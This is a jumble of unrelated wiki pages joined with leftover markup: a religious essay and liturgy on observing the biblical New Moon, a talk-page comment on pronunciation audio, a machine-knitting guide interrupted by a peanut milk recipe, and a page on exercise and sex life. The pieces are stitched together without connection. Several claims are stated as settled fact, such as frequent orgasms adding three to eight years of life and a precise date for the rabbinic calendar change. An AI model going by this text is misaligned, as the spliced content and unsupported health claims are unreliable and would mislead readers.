Judaism changed the New Year from Nisan to Tishri, which is the seventh month, based on a man-made system derived from the rabbinical determinations introduced from Babylon in 344 CE and sanctioned by Rabbi Hillel II in 358 CE..  The Dead Sea Scrolls, the LXX and modern scholarship have exposed this change which was made.  However, even rabbinical scholars such as Rabbi Kohn, the Chief Rabbi of Budapest writing in 1894, states categorically that the New Year of Rosh haShanah in Tishri is a late third century post Temple period innovation (Sabbatarians in Transylvania, CCG Publishing, 1998, p. v et. seq).
The Bible gives instruction that Israel kept, as we are to keep, the Feast of Nisan (New Year's Day) as a feast day.

==Sighting the New Moon==
Various factors such as  atmospheric pressure, temperature, humidity along the light path, altitude, latitude and longitude, fog, cloud/dust cover, glare etc. can all affect a first sighting.  No one can infallibly predict the moment when the new moon will become visible to the naked eye.  The general consensus of authoritative opinion is that a first sighting of the new moon could occur any time between about 15 and 48 hours after a conjunction.  The conjunction being when the earth is between the sun and the moon in perfect alignment.  The first sighting of the moon will be after the moon has moved out of this alignment.

In sighting the New Moon, one faces the western sky at sunset, drawing an imaginary line from the zenith overhead toward the setting sun, seeking the thin scimitar of light on either side of this imaginary line.  The sun sets in the west slightly right of where the new moon will be seen. As the sky darkens the first star is seen which is actually the planet Venus.  Gradually the crescent appears as a sliver just above the horizon.  The faint New Moon will bulge out to the right, with the horns pointing toward the left.  However, in early spring (autumn in southern hemisphere) the “Passover moon” will appear much like a saucer with both horns pointing upward.  Variations of this New Moon may be seen in springtime.  Biblical months are either 29 or 30 alternating days in length; at times two consecutive 30-day months may occur.  Only on the new moon will the moon be invisible until the sun sets.  It is as if Yahweh is concealing it so we will intentionally have to look for His sign in the sky.  

==Determining the New Year==
The New Year is determined by the New Moon which falls nearest the equinox, which ensures that the Full Moon falls after the equinox, while the sun stands in the sign of Aries.  In the Gregorian system the equinox can fall on 21-23 March.   The earliest date for the New Year has to be 14 days before 21 March, so that Passover will be at the full moon – i.e. 8 March. This was the earliest date for 1 Nisan. The latest date is determined by 15 Nisan and the sun in Aries. The sun leaves Aries on 19 April.  Thus, the day 19/20 April is the last day in which Passover can begin.  The 15th Nisan cannot be later than 20/21 April.   According to the ancient rules of the Hebrews, 1 Nisan, or the start of the sacred year, was not earlier than 8 March and not later than the Hebrew day on 8/9 April (Gregorian) in the case of a thirty day month falling with an equinox on 23 March.   It is impossible, therefore, for there to be a Passover earlier than the vernal equinox (21 March) or one later than 20/21 April.

Philo, the Jewish historian and contemporary of Yeshua the Messiah and the apostles, says that Moses established the moon of the vernal equinox as the first month of the year (The Works of Philo, On the Life of Moses II, chapter XLI, Part 222 and 224)  Josephus the Jewish historian also confirms this and defines it as &quot;when the sun was in Aries&quot; (Josephus, Ant. 3.201; III.x.5].

Because harvests are governed by the seasons, which are controlled by the movements of the heavenly bodies, the maturity of the barley crop in Israel will coincide with these calculations and is the necessary factor for establishing the new year so that there is the required grain to be offered at Firstfruits.

==Historical Observance of the Feast==
Psalm 81 tells us that Joseph instituted the Rosh Chodesh during his tenure as the viceroy of Egypt.  Joseph had the power to declare the decree and the people of Egypt, principally the sons of Israel, were delighted to make the recognition of the new moon as a joyful feast. The testimony was to honor Joseph for what he did as a righteous deliverer, who in many ways prefigured the coming Messiah of Israel and the redemption that He would ultimately bring.  All of Yahweh's feasts are a role play of eternal truths in His eternal purposes and keep His redemptive plan before us.   What Joseph set in place as a testimony,  has been established as a &quot;statute for Israel, a law of the God of Jacob&quot; (Psalm 81: 3-4)

In numbers 10:10 it is recorded that the trumpet is to be blown to sanctify the new Moon as a feast day.   &quot;At the beginnings of your months you shall offer a burnt offering to Yahweh: .. ..  this is the burnt offering of each month throughout the months of the year .. .. it shall be offered besides the continual burnt offering and its drink offering.   (Numbers 28:11-15 RSV)
Moses called the people to assembly on the new moon and spoke to them according to the commandments he had been given by Yahweh, exhorting them to faith and obedience.  (Deuteronomy 1: 3)   It is also recorded that Yahweh chose this sabbatical day to speak to Moses and give him instructions for Israel.  Numbers 1: 1-5

Moses commanded the keeping of the new Moons.  2 Chronicles 8:12-13
Solomon said that it, as well as the other feasts, were &quot;an ordinance forever to Israel&quot;   2 Chronicles 2: 3-4

The kings of Israel kept the feast of the new moon with its stipulated temple procedure.   1 Chron. 23:31; 2 Chron. 31: 3

We find a record that Saul held feasts on the new moon, according to the law.  When Saul turned against David and he fled and hid in the country, David gave instructions to explain his absence from the feast, indicating that this was a day when David would be missed, if he did not attend the King’s table on the New Moon.  (1 Samuel 20:4-18, 24) 

It was usual during the Temple period to seek guidance from the prophets on the New Moons.  ( 2 Kings 4:23)

In the restoration of the law under Nehemiah the New Moons were re-instituted and kept from that time through to the destruction of the Temple in 70 CE.   Josephus records that they were kept during the entire Temple period and the High Priest attended in the Temple on the New Moons and Sabbaths. 
 
The New Testament church also understood them, hence the reference in Colossians chapter 2 when the Gnostics were criticising them for their festivities, contrary to their ascetic practices. &quot;Therefore let no one pass judgment on you in questions of food and drink or with regard to a festival or a new moon or a sabbath&quot;. (Colossians 2:16 RSV)

The Church of God kept it for centuries. We know that at the Reformation the true followers of Messiah were still keeping the entire sacred calendar intact, as it was in the Temple period.

During the Millennium, the Sabbaths and New Moons will be kept.  Isaiah tells us the entire world will be honoring the New Moons and the Sabbaths as they worship Yahweh in the coming Kingdom.  &quot;From new moon to new moon, and from sabbath to sabbath, all flesh shall come to worship before me, says Yahweh&quot;. (Isaiah 66:23 RSV)  -  see Zech. 14:16-19

Also in Ezekiel 45:17   - the aspect of temple service for the new moons in the millennium
:::::46: 1,3 - enforcement of the New Moon as a sabbath and for worship

As sincere followers of Yahweh’s word, we should be observing them now and preparing ourselves as His Bride, fully adorned in all righteousness.

==The Significance of the New Moon Celebration==
The word used for New Moon in Hebrew is  'Rosh Chodesh' literally means “beginning, head, or renewal” and thus. the beginning or head of the month.  It is a time of spiritual renewal.

All through the scriptural record, the New Moon was a day when the prophets heard from Yahweh, being a day designated for waiting upon Yahweh, for discerning His purposes and for prophetic revelation.  Ezekiel 26:1;  29:17;  Haggai 1:1. 

They were days of assembly and God dealt with Israel at these times, speaking through His servants, the Prophets. 
 
We are also told in the New Testament these days are prophetic and foreshadow future events.  (Colossians 2:16-17)  The celebration of the new moon has great prophetic significance for Israel as the Bride of Yahweh and it was/is an appointed time of His choosing to give prophetic revelation to His people of His purposes for them.
 
The New Moon and the Sabbath were closely linked as both were holy, set-apart days unto Yahweh Himself and the celebration of the new moon is placed in importance in the scriptures alongside keeping the Sabbath.  It is not cited in the Torah until Numbers chapter 10 because it is a celebration based upon the testimony of Yahweh's corporate people being established as His luminary in the world.  Yahweh called Israel to be a light to the Gentiles, a holy, set-apart nation which reflected His glorious light (Exodus 19: ; 1 Peter 2: 4-5).  At the beginning of each month they were called to come aside from their normal functions for existence in this world, to reflect upon their ordained purpose of reflecting His presence in the world and revitalizing their spiritual lives in Him.

Joseph was given a dream of the sun, moon and stars as it related to their initial household of faith (Gen. 37: 9). This is carried through into its fulfillment in Revelation 12 with the woman (God's corporate people) arrayed with the glory of the sun (representing the glory of the Father), with her feet standing upon the moon (the reflected light of the sun), and the deputation of the twelve stars of His government assigned to her.  This portrays that the woman (Yahweh's Bride) in the end days will have come into the glory of the Father in her witness and testimony as the light-bearer of the Son (sun) in her earthly commission (standing upon the moon - i.e. established in her testimony as being THE light to this world).   

As His Bride keeps this feast of her appointment with Yahweh and comes into alignment with Him, she will reflect His light in ever increasing degrees of magnitude, until she actually shines with the glory of the Son of righteousness. &quot;But we all with unveiled face, beholding as in a mirror the glory of the Lord, are being transformed into the same image from glory to glory, just as by the Spirit of Yahweh.&quot;   2 Corinthians 3:18

==Celebrating the New Moon==
The beginning of the month is determined by the conjunction of the moon and for it's commencement  the shofar is blown in one long blast.  Numbers 10:10  states that the trumpets should be blown at all New Moons to sanctify the day and the offerings.  The new month is announced and brethren commence to fellowship.   After the blessing is said, greetings of peace are given to one another.  A traditional greeting of peace is Shalom Alechem! (peace be with you)  The response is Alechem Shalom! (upon you peace)

It is a time of fresh dedication of ourselves to Yahweh and of blessing Him and seeking His direction for the new month ahead.  We also take this time to ask His blessings on the planned endeavors for the coming month.  

These days are sanctified or set apart as days of sacrifice, for worship, for assembly and for us to make our spiritual offerings to Yahweh.  (2 Chronicles 2:4; Nehemiah 10:33; Ezekiel 44:24; 45:17)

It is now a spiritual act in a spiritual Temple, which makes it more powerful and just as important, as now we see its real significance in preparing us for the kingdom to come.

Traditionally there is singing and dancing in celebration of the occasion,  and the partaking of a festive meal together with suggested scripture reading of Deuteronomy 4: 7-9;  Psalm 104;  and Psalm 81

They were days of festivity,  as Psalm 81  portrays --  To the chief Musician upon Gittith, (guitar)  A Psalm of Asaph.  &quot;Sing for joy to God our strength! Shout to the God of Ya`akov! Start the music! Beat the drum! Play the sweet lyre and the lute! Sound the shofar at Rosh-Hodesh '''and''' at full moon for the pilgrim feast, because this is a law for Isra'el, a ruling of the God of Ya`akov.&quot; Ps. 81:1-4

They were a &quot;joyous occasion&quot; (Numbers 10:10), so much so that Yahweh threatened to take away these festive times, in punishment for their disobedience (Hosea 2:13). 

The New Moon of Trumpets (Yom Teruah) was also a day of restoration (or reading) of the Law of God.  (Nehemiah 8: 2)

A cleansing process began in the physical temple with the commencement of the new year and this points towards the spiritual cleansing of the spiritual Temple.  We are that spiritual Temple and the process of cleansing begins with us on the First New Moon of each year as a preparation for the coming Passover season.  It then is repeated throughout the year from New Moon to New Moon as we each come before Yahweh and renew our life in Him.  (Ezekiel 45:18; Numbers 28:11)   This will continue in the 1000 year reign of Yeshua. (Isaiah 66:22-23)

The New Moons of the other months of the year are similar to Sabbath days in which no trade or unnecessary work is done.  (Amos 8:5; Nehemiah 10:31)
[work which has to be done is allowed on the new moon]
 

Yahweh keeps His appointments with those who choose to meet with Him at His designated times and He enters His assembly at these times on these holy days of the Sabbaths and the New Moons to fulfill the spiritual reality of these feasts in the lives of His people.  (Ezekiel 46: 1-6)

== New words pronounciation ==

Hello, I find useful these learning books but I think the new words should be somehow linked to the pronounciation (attach the ogg from or link to wictionary.org sounds).

I'm trying to learn Dutch and the pronounciation is kind of difficult to guess :-D

What do you think? --[[User:Tct13|Tct13]] ([[User talk:Tct13|talk]]) 10:43, 25 April 2009 (UTC)

:I think that most language courses without links to audio files by native speakers are basically useless. (There are exceptions like dead languages or books about grammar.) This is probably the most important limitation of most of the wikibooks about foreign language learning. Unfortunately, neither wictionary nor wikimedia commons include pronounciations of a sufficiently large set of words. Furthermore, complete sentences would also be important for language learning. What can be done about it? Contributors should provide samples in their native language and appropriately licensed content should be uploaded to wikimedia commons. Moreover, authors of language learning books should be aware of this problem and find a solution &lt;b&gt;before&lt;/b&gt; they start writing a course on language learning. --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 10:40, 27 April 2009 (UTC)</text>

      <text xml:space="preserve">&lt;big&gt;SERVICE FOR DECLARATION OF THE NEW MOON&lt;/big&gt;
			
The service begins when three stars are normally visible in the sky, and at nightfall whenever the stars are not visible. The new moon may be observed by the calendar's astronomical calculations.

1.  OPENING PRAYER

Leader:   We celebrate the festival of the New Moon as an appointment with Yahweh God, as He has commanded us. 

Blessed are You, Yahweh our God, God of Abraham, Isaac and Jacob,  Our Father, we fervently call upon You. You are the Great and Mighty One, Most High God, whose Name alone is Yahweh, the Eternal One,  God of Hosts.

You are merciful and gracious, slow to anger, abounding in lovingkindness and keeping covenant forever with those who fear Your Name and keep Your commandments. You made the heavens and the earth by Your great power and by Your outstretched arm.  Nothing is too difficult for You. You are all-powerful to save and You bestow gracious favours to your people, in love.  You are holy and Your name is holy and we separate ourselves this night to come before You to honour, revere and praise Your holy Name.

All:  Blessed are You, Yahweh our God, God of Gods and Lord of Lords, the Holy One of Israel.

Leader:  You have called us to this appointed time to offer unto You sacrifices and offerings and to rejoice before You in the salvation of our souls which You have provided through Y'shua our Messiah.

You have given us the beginning of months as a season of expiation, of atonement for sin and renewal of our consecration in offering an acceptable sacrifice of our lives to You upon Your altar.

All:  Blessed are You Yahweh, our God, King of the universe, who has kept us and sustained us and enabled us to keep this appointment with You.

Leader:  Accept us Your people we pray, and let our prayers come before You and may our worship be acceptable in Your Presence. We ask that You would restore Your holy sanctuary upon earth and dwell with us once more in Your glory.

May we have the blessing of  beholding Your return to Zion when You will restore Your divine glory upon her.

All:  We bless and praise You for Your eternal counsels when You will have compassion upon Your people and restore Your glory once again upon Zion and Your kingdom shall be exalted over all.

2.  READING OF PSALM 81: 1-5

3.  BLOW SHOFAR

Leader:  &quot;Also in the day of your gladness, in your appointed feasts, and at the beginning of your months, you shall blow the shofar over your burnt offerings and over the sacrifice of your peace offerings; and they shall be a memorial for you before your God:  I am Yahweh your God.&quot;   Numbers 10:10   :(all gather outside to observe the new moon where the shofar is blown in every direction turning once clockwise to announce Rosh Chodesh. The service may be concluded inside) 

All:  Blessed are the people that know the sound of the shofar, O Lord. 
:We shall walk in the light of Your countenance, O Lord.

4.  THE SHEMA  Deuteronomy 6: 4-6

Sung:  Sh'ma Yisrael, Adonai Eh-lo-hay-nu Adonai e-chad. Ba-ruch shame k'vode mahl-choo-toe l'oh-lahm vah-ed. 
:Sh'ma Yisrael, Adonai Eh-lo-hay-nu Adonai e-chad.

Recited:  Hear O' Israel, Yahweh is our God, the Lord is One. Blessed is the Name of His glorious Kingdom for all eternity. Hear Israel, the Lord our God is one.

5.  LIGHTING THE MENORAH

Leader:  To separate Rosh Chodesh (the New Moon) from the rest of the month, we light the seven branches of the Menorah as a representation of the fullness of the Shekinah glory in the seven spirits of God which will illuminate the New Jerusalem.

We come before You Almighty God this night thanking You that all the fullness of the Godhead dwells in Y'shua our Messiah and in Him is hidden all the treasures of wisdom and knowledge and we are believing tonight that as we light the Menorah that You would impart to us an  increasing measure of Your Spirit  to shine in our hearts and to fill these earthen vessels  of ours with Your glory so that the illumination of Your Presence will be manifest through us.  (Colossians 2: 3, 9-10; 1:27)

We ask that You would impart unto us &quot;the spirit of wisdom and revelation in the knowledge of Y'shua, so that the eyes of our understanding might be enlightened to know what is the hope of His calling and the riches of the glory of His inheritance in us; And what is the exceeding greatness of His power toward us who believe, according to the working of His mighty power,&quot; &quot;so that we might be strengthened with might through His Spirit in our inner man , that Messiah may dwell in our hearts through faith and that we might comprehend and really experience the love of Messiah which passes knowledge; .. .. and be filled with all the fullness of God.&quot;   (Ephesians 1:17-19; 3:16-19)
:(Leader invokes the blessing of each of the seven spirits of God from Isaiah 11: 1-2 upon those present lighting each corresponding candle as the people by faith, receive the blessing)

Leader:  Would you fill us Your people this night with the Spirit of the Lord ;  (light first candle etc.)
:(wisdom; understanding; counsel; might; knowledge; and the fear of Yahweh God)

Response:  We receive the spirit of wisdom; (understanding; counsel; might; knowledge; and the fear of Yahweh God)	

6.  SCRIPTURE READING

Ezekiel 45 :17, 46: 1-6;  Isaiah 66:22-24

7.  SANCTIFICATION OF THE MONTH

Leader:  May it be Your will, Yahweh our God, and God of our fathers, that we begin this month with the pardoning of sin and the forgiveness of iniquity. Bless and sanctify this new month to us and to all Your people with joy and gladness, with blessing and provision for all our needs in peace and in prosperity.

Unite our hearts to fear Your Name so that we will keep Your commandments and walk in the paths of righteousness for Your honour and  to receive Your blessing.

We long for that day when the Torah will go forth from Zion to all nations, when darkness will flee away, when the saints of the Most High will possess the Kingdom, when You will destroy those who destroy of the earth, when wars will forever cease, when justice and righteousness will fill the earth as the waters cover the sea and when “Yahweh will be King over all the earth, and His Name One.”  And let us all say, Amein.

All:  We express our gratitude to You, Creator of the universe, for the renewal of our lives and the hope we have in You for the coming month.  Blessed are You,  Who sanctifies Your people Israel in the beginning of the month.

8.  PETITIONS

All:   Oh Yahweh our God, we call upon You this day to hear our prayer for forgiveness for all our shortcomings, for all our transgressions and  for all our sins. 
For Your holy Name's sake and for Zion's sake, and for Your people, and for all mankind.  
We turn to You and seek Your compassion and Your mercy, Yahweh, our Rock and our Redeemer.  Hear our prayer!

Leader:  O Yahweh, God of our fathers and our God, we ask that in this coming month that you would, 
:*give us what we need spiritually to grow into Your likeness;
:*that You would give us what we need  emotionally to walk in Your ways;
:*that You would give us what we need  mentally to be conscious of You and Your Word  at all times;
:*that You would give us what we need financially so that we would have sufficient for ourselves and can bless others;	
:*that You would give us what we need physically so we can serve You faithfully and glorify You in all we do, Amein.

9.  BLESSING OF THE WINE

Leader:  Yahweh is the Incomprehensible One, before the beginning of the creative process He was and ever shall be.  Our Heavenly Father, the great Creator, chose to emerge from dwelling in the unapproachable light of eternity and reveal Himself through His creation, His manifestation of light into the world.

&quot;For it is God who commanded the light to shine out of darkness who has shone in our hearts to give the light of the knowledge of the glory of God in the face of Y'shua the Messiah.  But we have this treasure in earthen vessels that the excellence of the power may be of God and not of us&quot;   2 Corinthians 4: 6-7

&quot;Y'shua said, I am the Vine and you are the branches, He who abides in Me and I in him, bears much fruit:&quot;  John 15: 5a

All:  Blessed are You Yahweh our God, King of the universe, who creates the fruit of the vine.   (Pass the cup of blessing)

10.  BLESSING OF THE BREAD

&quot;He has in these last days spoken unto us by his Son, whom he has appointed heir of all things, by whom also he made the worlds; Who being the brightness of his glory, and the express image of his person, and upholding all things by the word of his power, when he had by himself purged our sins, sat down on the right hand of the Majesty on high: Being made so much better than the angels, as he hath by inheritance obtained a more excellent name than they.&quot;   (Hebrews 1:2-4)

&quot;For it was fitting for Him, for whom are all things and by whom are all things, in bringing many sons to glory, to make the captain of their salvation perfect through suffering.  For both He that sanctifies and those who are being sanctified are all of one, for which reason He is not ashamed to call them brethren.&quot;   (Hebrews 2:10-11)

All:  Blessed are You, Yahweh our God, King of the universe, who resurrects Bread from the earth.   (Pass the bread)

Blessed are You Yahweh, for sanctifying us Your people in the renewal of our lives this month.

11.  THANKSGIVING AND PRAISE

We thank You and praise You for the redemption which You have provided in Y'shua our Messiah and for all the  mighty acts which You have performed on our behalf and the victories which You have given us in our lives both at this time and in the previous times. You are a mighty God and Saviour and all who live shall thank You and praise Your Name in truth.

Blessed are You, O Yahweh, God of our salvation and our Succourer.  
You are Good and worthy to be praised and we give thanks unto You for all Your great benefits to us. 
 
:(Time for personal testimonies)

12.  FESTIVE MEAL 
:(Grace after the meal)

13.  DEVOTIONS AND WORSHIP

14.  PRIESTLY BLESSING    Numbers 6:24-26

He who exists will kneel before you presenting gifts and will guard you with a hedge of protection.

He who exists will illuminate you with the wholeness of His Being, bringing order (shalom), and He will beautify you.

He who exists will lift up the wholeness of His Being and look upon you to set in place all you need to be whole and complete.  
:(a translation by Jeff Bennett from the Paleo Hebrew script)







For Rosh Chodesh a seven stick menorah is used to set it apart from the Sabbath. Seven candles mounted on a plate can be used as a substitute.
(Based upon the standard Jewish New Moon service using suggestions for the service by Mike Clayton)

[[image:MachineKnittingAnSofi.jpg‎|center]]
This text is not about ready patterns, but a guide as to how you can produce your own patterns. It is my hope that it will be a useful reference for many years to come, regardless of changing fashions.

I have organized the text with the easiest things first. This is so in the chapter on [[Machine_Knitting/Knitting_samples|Knitting samples]], and in the following text about knitting from specific measurements, which I have divided into two chapters. The first of these, [[Machine_Knitting/Knitting_to_measure|Knitting to measure]], is for those who just want to concentrate on knitting straightforward jumpers in the easiest way possible, whilst in the later chapter, [[Machine_Knitting/Garment_patterns|Garment patterns]], I have written about fitting methods and how to create a basic pattern from that, firstly, showing the easiest method of doing this, and later telling how from the basic pattern, you can make alterations and adjustments. In this way, it is my hope that there is something for everyone. You may then use whatever part of it you want to use, but a condition for understanding the text is that you have read the chapter about [[Machine_Knitting/Knitting_samples|Knitting samples]], because it is a basic idea behind the whole text that you use your own knitting sample for all measurements.

But of course, there are many ways of making things, and the methods described should be conceived just as suggestions.

I hope that with this book, I can spare someone for making all the same mistakes as I have made myself during the 40 years that I have been machine-knitting.

Many thanks to my son Agner who has helped me with illustrations and advice and published this on the web, and to my son Kåre who has made an admirable effort to help with the translation.

This book was originally written in Danish ([[http://da.wikibooks.org/wiki/Maskinstrikning]]). The English translation has been carried out mainly by my son Kåre and other family members who have helped with translation and linguistic corrections. However, it has been difficult to find correct translations for many technical expressions, and I apologize for any misleading translations. I would be happy if somebody will correct and improve the English translation.

August 2003, Gudde Fog.

== Ingredients ==

*1 dl peanuts
*1 ml sea salt
*10 dl water

== Utensils ==

*a blender
*a colander
*a fine filter of some sort, e.g. a reusable coffee filter
*a funnel
*two bottles

== Procedure ==

# Rinse peanuts in colander. If salted peanuts are used, rinse well with hot water.
# Place peanuts in blender with half of the water, and blend on high speed for maybe 1-2 minutes.
# Add the rest of the water and blend on high speed for maybe 1 minute, until smooth.
# Pour into a bottle, add the salt, shake, and put in the fridge for a few hours.
# When most of the peanut flour has settled at the bottom of the bottle, pour carefully through a filter into another bottle.
# When the filter starts clogging with peanut flour, squeeze out the milk, and rinse the filter. You can also use a spoon or something similar in the filter to help most of the milk get through before squeezing.
 
== Notes == 
*Additional sweetener or other flavouring, e.g., vanilla, may be added to taste.
*The sea salt takes away the watery feeling. It should not taste salt. You can experiment as to what amount is right for you.
*The same goes for the thickness of the milk. Add more or less water to taste.
*Peanuts are extremely nutritious, and does not have the same health issues as soy.

==What is a knitting machine?==
[[image:MachineKnittingKnittax.jpg‎|center]]
A knitting machine is a long apparatus furnished with a row of hooked needles, or rather, casting-on needles. Usually there are 200 needles. They sit in a base which is called the needle bed. A part of the needle (the butt) protrudes through the needle bed and it is this which makes contact with the knitting carriage. The carriage, which is pushed across the stitches, has on its underside several 'cams' which govern the movement each needle will make as the carriage is moved across the bed. Every needle has a latch which may be tilted back and forth, whereby it opens and closes the access to the hook of the needle. The stitches sit in the hooks, and when you drive the carriage across the needles, they first are pushed up into the upper position, whereby the stitches push back the latches. Next, the yarn feeder lays new thread into the hooks. After that, the needles are pushed down again, whereby the old stitches push the latches forward, shutting off the needle hooks and sliding out over the needles. At this moment, the new stitches have been formed. In the oldest machines, these cams were quite simple, and therefore the machines could do little but knit forwards and backwards. Newer machines have various buttons that you can move or push in order to change the needle routes. This allows for textured and multi-coloured patterning. For instance the needles may be pushed completely forward, whereby they slip into a trail where they are not included in the knitting - unless you move another button, which again includes them. On older machines, you have to include them manually.

'''The needles have four possible positions:'''
; 'Out of work' position
: Those needles that are out of use are pushed completely back.
; Working position
: Brought forward about 1/2&quot;.
; Idling position, or upper working position
: Precisely so much forward that the stitches just do not enter behind the latches.
; Resting position (or holding position)
: Completely forward.

Some machine instructions use other designations, e.g. letter designations, but as the instructions of different machines use different terminologies, I have chosen to use the terms mentioned above.

In some machines, the system differs somewhat, e.g. PASSAP. But the system described above is the most common.

The oldest types that I have seen, are the so-called double-bed machines. The name refers to the fact that there are two needle beds, i.e. those bottoms on which the needles sit. The two apparatuses are oriented towards each other, at a slant upwards towards their midline. While you are working, the wrongside of the knitting faces outward. When there are two machines oriented towards each other, the front one will have its rightside facing the knitting person, but you cannot see that, because the knitting is between the machines. This means that one may have every other stitch on the foremost machine and every other on the hindmost, i.e. knit 1 plain and 1 purl, 2 plain and 2 purl, or other combinations. Or you may make circular knitting. The oldest machines demanded that very heavy weights were hung on the knitting, and if you knitted plain knitting, you would also have to attach side weights that must be moved for every tenth row. The foremost machine could be detached if you wanted to knit plain knitting. In very old machines, the needles could not be put into resting position, and even older machines did not have the idling position either.

Later, some more practical machines appeared. Various sorts of casting-off systems were invented, which helped so that you did not have to use so heavy weights, but you could not completely do without weights. On the knitter (the hindmost apparatus), it is possible to knit without weights. If you knit on both apparatuses, you need, with most machines, to use weights, but not as heavy as with the oldest machines. In many cases you also have to use weights with a single-bed machine, particularly if you knit patterns, but what you use is only a light comb, upon which small, light side weights are hung.

But one machine had a completely different system. This was KNITTAX. It did not use weights, but, instead of that, springs that sat in between every needle and held the stitches; and when the carriage was led across, it tilted the springs upwards and down again, so that they held the next row while the machine was knitting. KNITTAX was a single-bed machine. A ribber for it was available, but it was placed vertically in front of the single-bed apparatus and could still utilize the springs, so it did not need weights. But it had only every other needle, so you could not knit more than one combination of knit and purl rows - it was meant only for rib borders with 1 knit and 1 purl, and for fisherman's rib (In German and Scandinavian languages, this is called &quot;patent knitting&quot;. It seems that &quot;fisherman's rib&quot; is the English word for it, but a dictionary had the term &quot;raised ribbing&quot;). The rib apparatus had no resting position. KNITTAX was a fine machine. It was easy to knit with, but it had no automatics. The needle distance was approx. 5 mm. The first machines that appeared did not have a yarn feeder. You had to put the thread by hand. This was possible because it had another knitting position than other machines; it knitted with the stitches behind the latches. This, plus a slightly larger needle distance, implied that you could use slightly thicker yarn. Eventually, machines with yarn feeder also appeared. If you want to buy a second-hand KNITTAX, you must check that it has a yarn feeder. KNITTAX also produced some smaller machines meant for baby clothing. They had too few needles to allow you to knit a large adult size.

Later, PASSAP took up the idea of having springs instead of weights. This was a double-bed machine that could knit rib without weights, but weights existed for it in case they were needed. It was the only machine that was able to knit patterns in circular knitting. It had slightly differing needle positions. It was an excellent machine, but the producers were not smart enough to follow up when the electronics appeared, so the result was that it was run down by the Japanese.

Today, the machines on the market in my country are mostly Japanese; therefore, this text is mainly about these. ROYAL and BROTHER are the most common, but others have been awailable which are no longer imported, e.g. JUKI. Japanese machines have a needle distance of 4½ mm. You may buy them as single-bed machines, which, in that case, are placed flat on the table. If you buy an accessory ribber, you have to slant the machine slightly. With the machine follows a clamp with which it can be lifted up in an upwards-slanted position, allowing the ribber, which is also slanted, to be attached. Of course, the ribber may be detached again, but that is not necessary, for it can be lowered, so that you can manage.

You can buy machines with punch cards that extend over 24 stitches. These are probably the most sold models, but they are also available with diskettes with countless patterns extending over the entire machine. You may make your own patterns on punch cards as well as diskettes. There have also been machines with print cards, i.e. transparent sheets with small squares where you could draw your patterns with a special pen. They extended over 60 stitches. Unfortunately, they are not available anymore. This is a shame, because here you had a better overview over your drawings. The latest new machines require that you have a computer screen if you want to see the entire pattern at a time.

With ROYAL, all patterns have to be made on punch cards; you can do nothing manually. With BROTHER, all needles are first pushed up into idling position, and the pattern is knitted in the row that follows. Thereby, you can always see what the machine will do in the next row and have a chance to correct something, if you want. You may also make simple patterns without having them on punch cards by pushing up the needles manually. Since March 2000, BROTHER is not imported anymore, but they have issued a guarantee that spare parts will be available for the next 10 years. The new models of ROYAL are now called SILVER REED.

Some older Japanese models had pattern buttons for a 6, 8 or 12 stitch pattern repeat. You could enter a pattern repeat once, and when you pulled a handle or a switch, the needles came into working position all over the machine, allowing you to knit a pattern over them. You may probably be able to find a second-hand machine of this type, if you are interested. But later, it became possible to knit a large single pattern (up to 200 needles on certain machines eg Brother 950i electronic), so machines were constructed that could meet this demand.

===Yarn===
The most popular knitting machines have 4.5mm spacing between needles and are designed to knit from a 2-ply laceweight yarn through to 4-ply fingering yarn. It is possible to use Double Knitting (worsted) yarn but knitted on every other needle only.

There are 9mm spaced machines known as 'chunky knitters' usually having 150 - 180 needles that will knit from double knit through to very chunky yarn.

Yarns designed for machine knitting are usually wound onto cones. They are available from very fine single ply through to chunky quality. Several threads of finer yarn can be knitted together to create a thicker fabric if desired.

      <text xml:space="preserve">== Exercise and your sex life==

Exercise improves one’s sex life due to the fact that sexual function is affected by general health.  Therefore, one's sex life can be better by improving their health and taking care of him/herself.  A study conducted At Harvard School of Public Health, a study was conducted on men and their sexual health.  The results showed that men who exercised vigorously for 20 to 30 minutes were about half as likely to have erection problems as inactive men.  In another study, women participated in cycling for 20 minutes and afterward their sexual response measuring their blood flow in genital tissue was done.  As a result, the women’s vaginal responses were greatly higher after exercising.  Doctors state that exercise strengthens the cardiovascular system and improves circulation which is important for sexual function.  Sex is a form of endurance and people who exercise at least 30 minutes, three times a week, helps both partners perform longer and more often.


== Exercises to improve your sex life ==

There are some exercises that can be performed to help improve one’s sex life.  Push-ups and sit-ups strengthen the shoulders, chest, and abdominals, which are muscles used during sexual intercourse.  Kegel exercises firm the muscles in the vagina which allows women to reach orgasm more easily.  These exercises can also be helpful for men by delaying ejaculation by contracting their muscles. Stretching the pelvic muscles keeps the muscles flexible and helps one reach orgasm during sex.  Pelvic lifts and the butterfly are stretches that can enhance not only one’s sex life but mental and physical health.


== Does sex affect a person’s quality/quantity of life? ==

Being sexually active has shown to be beneficial for the quality of a person’s life.  The elderly are a targeted population where sex has been shown to improve their quality of life and their self-esteem.  Women also see the positives effects of partaking in sexual activity.  Many women suffer from hypoactive sexual desire disorder (HSDD- The persistent lack of sexual desire causing stress or interpersonal difficulties.) and have noted poorer health status and a worse health related quality of life than those who do not have HSDD.  The women with the disorder are more than twice as likely to have health issues like back pain, fatigue, and memory problems.  Women who have the disorder experience similar problems to people with serious chronic conditions.  

Sex, or touching in general, releases hormones and other substances that are similar to meditation.  Therefore sex can be considered a technique use to relax and distress.  It can also increase self-esteem.  Self-esteem is largely considered a perception of self worth.  With sex and the frequent touching that occurs, it communicates worth to one another. Sex also releases hormones in the body and increases bonding and intimacy which fight feelings of loneliness and depression.

Sex has also been shown to increase a person’s longevity.  Frequent orgasms can increase life expectancy by about three to eight years.  Studies have also shown that men who have frequent orgasms have a 50 percent reduction in mortality risk.

== Does age affect your sex life? ==

Sex tends to change for better and/or worse as people get older because of physical and emotional changes in the body.  These changes can affect a person’s ability or have and enjoy sex.  For example, after a women goes through menopause, she may enjoy sex more without having to worry about getting pregnant.  Other changes for women include a change in her vagina and most women have less vaginal lubrication. For men, as they get older, impotence is more likely to occur.  (Impotence is the loss of ability to have and keep an erection hard enough for sexual intercourse.)

Illnesses and disabilities that come with older age may also affect one’s sex like as well.  This includes arthritis, chronic pain, incontinence, stroke, and the medications that are taken to help with the illnesses and disabilities have an effect on their sex life.  Older couples also face added concerns other than the daily stresses that other people tend to deal with.  Age, illness, retirement, and other worries can cause sexual difficulties.  However, despite the more physical problems that may come with age, people who are in their 90’s have still shown to be sexually active.  Having a positive attitude towards sexual activity plays a major role in desire and outcome of its effects.


